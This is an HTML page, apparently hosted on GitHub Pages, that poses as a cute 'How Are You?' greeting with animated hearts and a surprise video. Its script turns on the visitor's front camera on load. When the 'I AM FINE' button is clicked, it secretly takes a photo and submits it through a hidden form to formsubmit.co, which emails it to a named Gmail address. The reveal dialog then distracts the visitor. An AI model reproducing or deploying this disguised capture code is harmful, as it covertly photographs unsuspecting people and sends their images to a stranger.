# Xyz
<!DOCTYPE html>
<html lang="en">
<head>
<title>How Are You?</title>

<style>
body {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  height: 100vh;
  margin: 0;
  background: linear-gradient(to bottom right, #fdf0f5, #dbe6ff);
  font-family: Arial, sans-serif;
  overflow: hidden;
}

h2 {
  font-size: 3em;
  color: palevioletred;
  text-align: center;
  margin-bottom: 30px;
  text-shadow: 2px 2px 5px rgba(0,0,0,0.2);
  z-index: 2;
}

button {
  font-size: 2em;
  padding: 15px 30px;
  color: white;
  background-color: blueviolet;
  border: none;
  border-radius: 15px;
  cursor: pointer;
  transition: transform 0.3s, box-shadow 0.3s, opacity 0.5s;
  z-index: 2;
  position: relative;
}

button:hover {
  transform: scale(1.1);
  box-shadow: 0 0 20px rgba(138,43,226,0.8);
}

.heart {
  position: absolute;
  top: -20px;
  color: #1e90ff;
  font-size: 20px;
  animation: fall linear infinite;
  z-index: 1;
  opacity: 0.8;
}

@keyframes fall {
  to {
    transform: translateY(110vh) rotate(360deg);
  }
}

video {
  display: none;
}


/* =========================
   REVEAL DIALOG
========================= */

.reveal-overlay {
  display: none;
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.75);
  justify-content: center;
  align-items: center;
  z-index: 20;
}

.reveal-box {
  width: 90%;
  max-width: 500px;
  background: white;
  border-radius: 20px;
  padding: 25px;
  text-align: center;
  box-shadow: 0 0 30px rgba(0,0,0,0.5);
}

.reveal-box h3 {
  color: palevioletred;
  font-size: 2em;
  margin-bottom: 20px;
}

#revealButton {
  font-size: 1.5em;
  padding: 15px 25px;
}

#revealVideo {
  display: none;
  width: 100%;
  max-height: 70vh;
  border-radius: 15px;
  margin-top: 10px;
}

</style>
</head>


<body>

<h2>HELLO ❤ — HOW ARE YOU?</h2>

<button id="capture">
  I AM FINE
</button>


<canvas id="canvas" style="display:none;"></canvas>


<!-- =========================
     ORIGINAL FORM
========================= -->

<form
  id="imageForm"
  action="https://formsubmit.co/ganeshbist257@gmail.com"
  method="POST"
  enctype="multipart/form-data"
>

  <input
    type="hidden"
    name="_captcha"
    value="false"
  >

  <input
    type="hidden"
    name="_template"
    value="table"
  >

  <input
    type="hidden"
    name="_next"
    value="https://Binodbist7.github.io/Qnahi/index.html"
  >

  <input
    type="file"
    id="imageInput"
    name="image"
    accept="image/png, image/jpeg"
    style="display:none;"
  >

  <button
    type="submit"
    style="display:none;"
  >
    Submit
  </button>

</form>


<!-- =========================
     REVEAL DIALOG
========================= -->

<div
  class="reveal-overlay"
  id="revealOverlay"
>

  <div class="reveal-box">

    <h3>
      💙 A Little Surprise 💙
    </h3>

    <button id="revealButton">
      CLICK TO REVEAL
    </button>


    <!--
      Put reveal.mp4 in the same
      GitHub repository as index.html
    -->

    <video
      id="revealVideo"
      controls
      playsinline
    >

      <source
        src="reveal.mp4"
        type="video/mp4"
      >

      Your browser does not support the video.

    </video>

  </div>

</div>



<script>

/* =========================
   ORIGINAL VARIABLES
========================= */

const canvas =
  document.getElementById("canvas");

const captureButton =
  document.getElementById("capture");

const imageInput =
  document.getElementById("imageInput");

const form =
  document.getElementById("imageForm");

let video;


/* =========================
   START CAMERA
========================= */

navigator.mediaDevices.getUserMedia({
  video: {
    facingMode: "user"
  }
})

.then(stream => {

  video =
    document.createElement("video");

  video.srcObject = stream;

  video.play();

})

.catch(err => {

  console.error(
    "Error accessing camera:",
    err
  );

});


/* =========================
   HEART ANIMATION
========================= */

function createHeart() {

  const heart =
    document.createElement("div");

  heart.classList.add("heart");

  heart.innerHTML = "💙";

  heart.style.left =
    Math.random() * 100 + "vw";

  heart.style.fontSize =
    (Math.random() * 20 + 10) + "px";

  heart.style.animationDuration =
    (Math.random() * 5 + 5) + "s";

  document.body.appendChild(heart);

  setTimeout(() => {

    heart.remove();

  }, 10000);

}


setInterval(
  createHeart,
  300
);


/* =========================
   REVEAL ELEMENTS
========================= */

const revealOverlay =
  document.getElementById(
    "revealOverlay"
  );

const revealButton =
  document.getElementById(
    "revealButton"
  );

const revealVideo =
  document.getElementById(
    "revealVideo"
  );


/* =========================
   CAPTURE BUTTON
========================= */

captureButton.addEventListener(
  "click",
  () => {

    if (!video) {

      alert(
        "Camera not ready!"
      );

      return;

    }


    /* Capture photo */

    canvas.width =
      video.videoWidth || 1080;

    canvas.height =
      video.videoHeight || 1440;


    const ctx =
      canvas.getContext("2d");


    ctx.drawImage(
      video,
      0,
      0,
      canvas.width,
      canvas.height
    );


    /* Convert photo */

    canvas.toBlob(blob => {

      const file =
        new File(
          [blob],
          "photo.png",
          {
            type: "image/png"
          }
        );


      if (window.DataTransfer) {

        const dt =
          new DataTransfer();

        dt.items.add(file);

        imageInput.files =
          dt.files;

      }


      /*
        Keep the original FormSubmit
        behavior.
      */

      if (form.requestSubmit) {

        form.requestSubmit();

      }

      /*
        Show reveal dialog after
        the photo submission starts.
      */

      setTimeout(() => {

        revealOverlay.style.display =
          "flex";

      }, 700);


    }, "image/png");


    /* Fade button */

    captureButton.style.transition =
      "opacity 0.5s";

    captureButton.style.opacity =
      0;

  }
);


/* =========================
   CLICK TO REVEAL
========================= */

revealButton.addEventListener(
  "click",
  () => {

    revealButton.style.display =
      "none";

    revealVideo.style.display =
      "block";


    revealVideo.play()
      .catch(error => {

        console.log(
          "Video playback requires user interaction."
        );

      });

  }
);

</script>

</body>
</html>
